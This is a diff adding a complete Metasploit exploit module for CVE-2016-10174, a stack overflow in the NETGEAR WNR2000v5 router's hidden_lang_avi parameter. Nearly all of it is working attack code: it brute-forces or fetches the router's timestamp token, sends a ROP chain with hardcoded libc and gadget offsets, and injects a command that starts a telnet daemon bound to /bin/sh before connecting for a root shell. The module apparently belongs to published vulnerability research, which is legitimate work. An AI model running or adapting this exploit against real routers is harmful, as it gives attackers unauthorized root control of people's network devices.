@@ -1,0 +1,270 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'time'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::CRand
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'NETGEAR WNR2000v5 (Un)authenticated hidden_lang_avi Stack Overflow',
+      'Description'    => %q{
+        The NETGEAR WNR2000 router has a buffer overflow vulnerability in the hidden_lang_avi
+        parameter.
+        In order to exploit it, it is necessary to guess the value of a certain timestamp which
+        is in the configuration of the router. An authenticated attacker can simply fetch this
+        from a page, but an unauthenticated attacker has to brute force it.
+        Bruteforcing the timestamp token might take a few minutes, a few hours, or days, but
+        it is guaranteed that it can be bruteforced.
+        This module implements both modes, and it works very reliably. It has been tested with
+        the WNR2000v5, firmware versions 1.0.0.34 and 1.0.0.18. It should also work with hardware
+        revisions v4 and v3, but this has not been tested - with these routers it might be necessary
+        to adjust the LibcBase variable as well as the gadget addresses.
+      },
+      'Author'         =>
+        [
+          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => ['unix'],
+      'References'     =>
+        [
+          ['CVE', '2016-10174'],
+          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt'],
+          ['URL', 'http://seclists.org/fulldisclosure/2016/Dec/72'],
+          ['URL', 'http://kb.netgear.com/000036549/Insecure-Remote-Access-and-Command-Execution-Security-Vulnerability']
+        ],
+      'Targets'        =>
+        [
+          [ 'NETGEAR WNR2000v5',
+            {
+              'LibcBase'             => 0x2ab24000,         # should be the same offset for all firmware versions (in libuClibc-0.9.30.1.so)
+              'SystemOffset'         => 0x547D0,
+              'GadgetOffset'         => 0x2462C,
+  #The ROP gadget will load $sp into $a0 (which will contain the system() command) and call $s0 (which will contain the address of system()):
+  #LOAD:0002462C                 addiu   $a0, $sp, 0x40+arg_0
+  #LOAD:00024630                 move    $t9, $s0
+  #LOAD:00024634                 jalr    $t9
+              'Payload'        =>
+                {
+                  'BadChars'         => "\x00\x25\x26",
+                  'Compat'  => {
+                    'PayloadType'    => 'cmd_interact',
+                    'ConnectionType' => 'find',
+                  },
+                },
+            }
+          ],
+        ],
+      'Privileged'     => true,
+      'Arch'           => ARCH_CMD,
+      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
+      'DisclosureDate'  => 'Dec 20 2016',
+      'DefaultTarget'   => 0))
+    register_options(
+      [
+        Opt::RPORT(80),
+        OptString.new('HttpUsername', [true, 'Username for the web interface (not needed but exploitation is faster)', 'admin']),
+        OptString.new('HttpPassword', [true, 'Password for the web interface (not needed but exploitation is faster)', 'password']),
+      ], self.class)
+    register_advanced_options(
+      [
+        OptInt.new('TIME_OFFSET', [true, 'Maximum time differential to try', 5000]),
+        OptInt.new('TIME_SURPLUS', [true, 'Increase this if you are sure the device is vulnerable and you are not getting a shell', 200])
+      ], self.class)
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri'     => '/',
+      'method'  => 'GET'
+    })
+    if res && res.headers['WWW-Authenticate']
+      auth = res.headers['WWW-Authenticate']
+      if auth =~ /WNR2000v5/
+        return Exploit::CheckCode::Detected
+      elsif auth =~ /WNR2000v4/ || auth =~ /WNR2000v3/
+        return Exploit::CheckCode::Unknown
+      end
+    end
+    Exploit::CheckCode::Safe
+  end
+
+  def uri_encode (str)
+    "%" + str.scan(/.{2}|.+/).join("%")
+  end
+
+  def calc_address (libc_base, offset)
+    addr = (libc_base + offset).to_s(16)
+    uri_encode(addr)
+  end
+
+  def get_current_time
+    res = send_request_cgi({
+      'uri'     => '/',
+      'method'  => 'GET'
+    })
+    if res && res['Date']
+      date = res['Date']
+      return Time.parse(date).strftime('%s').to_i
+    end
+  end
+
+  def get_auth_timestamp
+    res = send_request_raw({
+      'uri'     => '/lang_check.html',
+      'method'  => 'GET',
+      # automatically uses HttpPassword and HttpUsername to authenticate
+    })
+    if res && res.code == 401
+      # try again, might fail the first time
+      res = send_request_raw({
+        'uri'     => '/lang_check.html',
+        'method'  => 'GET',
+      # automatically uses HttpPassword and HttpUsername to authenticate
+      })
+    end
+    if res && res.code == 200
+      if res.body =~ /timestamp=([0-9]{8})/
+        $1.to_i
+      end
+    end
+  end
+
+  # Do some crazyness to force Ruby to cast to a single-precision float and
+  # back to an integer.
+  # This emulates the behaviour of the soft-fp library and the float cast
+  # which is done at the end of Netgear's timestamp generator.
+  def ieee754_round (number)
+    [number].pack('f').unpack('f*')[0].to_i
+  end
+
+
+  # This is the actual algorithm used in the get_timestamp function in
+  # the Netgear firmware.
+  def get_timestamp(time)
+    srandom_r time
+    t0 = random_r
+    t1 = 0x17dc65df;
+    hi = (t0 * t1) >> 32;
+    t2 = t0 >> 31;
+    t3 = hi >> 23;
+    t3 = t3 - t2;
+    t4 = t3 * 0x55d4a80;
+    t0 = t0 - t4;
+    t0 = t0 + 0x989680;
+
+    ieee754_round(t0)
+  end
+
+  def get_payload
+    rand_text_alpha(36) +                                                                    # filler_1
+      calc_address(target['LibcBase'], target['SystemOffset']) +                             # s0
+      rand_text_alpha(12) +                                                                  # s1, s2 and s3
+      calc_address(target['LibcBase'], target['GadgetOffset']) +                             # gadget
+      rand_text_alpha(0x40) +                                                                # filler_2
+      "killall telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l /bin/sh"             # payload
+  end
+
+  def send_req(timestamp)
+    begin
+      uri_str = (timestamp == nil ? \
+        "/apply_noauth.cgi?/lang_check.html" : \
+        "/apply_noauth.cgi?/lang_check.html%20timestamp=#{timestamp.to_s}")
+      res = send_request_raw({
+          'uri'     => uri_str,
+          'method'  => 'POST',
+          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
+          'data'    => "submit_flag=select_language&hidden_lang_avi=#{get_payload}"
+      })
+    rescue ::Errno::ETIMEDOUT, ::Errno::ECONNRESET, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
+      return
+    end
+  end
+
+  def exploit
+    # 1: try to see if the default admin username and password are set
+    timestamp = get_auth_timestamp
+
+    # 2: now we try two things at once:
+    # one, if the timestamp is not nil then we got an authenticated timestamp, let's try that
+    # two, if the timestamp is nil, then let's try without timestamp first (the timestamp only gets set if the user visited the page before)
+    print_status("#{peer} - Trying the easy way out first")
+    send_req(timestamp)
+    begin
+      ctx = { 'Msf' => framework, 'MsfExploit' => self }
+      sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => 23, 'Context' => ctx, 'Timeout' => 10 })
+      if not sock.nil?
+        print_good("#{peer} - Success, shell incoming!")
+        return handler(sock)
+      end
+    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
+      sock.close if sock
+    end
+
+    print_bad("#{peer} - Well that didn't work... let's do it the hard way.")
+
+    # no shell? let's just go on and bruteforce the timestamp
+    # 3: get the current date from the router and parse it
+    end_time = get_current_time
+    if end_time.nil?
+      fail_with(Failure::Unknown, "#{peer} - Unable to obtain current time")
+    end
+    if end_time <= datastore['TIME_OFFSET']
+      start_time = 0
+    else
+      start_time = end_time - datastore['TIME_OFFSET']
+    end
+    end_time += datastore['TIME_SURPLUS']
+
+    if end_time < (datastore['TIME_SURPLUS'] * 7.5).to_i
+      end_time = (datastore['TIME_SURPLUS'] * 7.5).to_i
+    end
+
+    print_good("#{peer} - Got time #{end_time} from router, starting exploitation attempt.")
+    print_status("#{peer} - Be patient, this might take a long time (typically a few minutes, but it might take hours).")
+
+    # 2: work back from the current router time minus datastore['TIME_OFFSET']
+    while true
+      for time in end_time.downto(start_time)
+        timestamp = get_timestamp(time)
+        sleep 0.1
+        if time % 400 == 0
+          print_status("#{peer} - Still working, trying time #{time}")
+        end
+        send_req(timestamp)
+        begin
+          ctx = { 'Msf' => framework, 'MsfExploit' => self }
+          sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => 23, 'Context' => ctx, 'Timeout' => 10 })
+          if sock.nil?
+            next
+          end
+          print_status("#{peer} - Success, shell incoming!")
+          return handler(sock)
+        rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
+          sock.close if sock
+          next
+        end
+      end
+      end_time = start_time
+      start_time -= datastore['TIME_OFFSET']
+      if start_time < 0
+        if end_time <= datastore['TIME_OFFSET']
+          fail_with(Failure::Unknown, "#{peer} - Exploit failed.")
+        end
+        start_time = 0
+      end
+      print_status("#{peer} - Going for another round, finishing at #{start_time} and starting at #{end_time}")
+
+      # let the router clear the buffers a bit...
+      sleep 30
+    end
+  end
+end
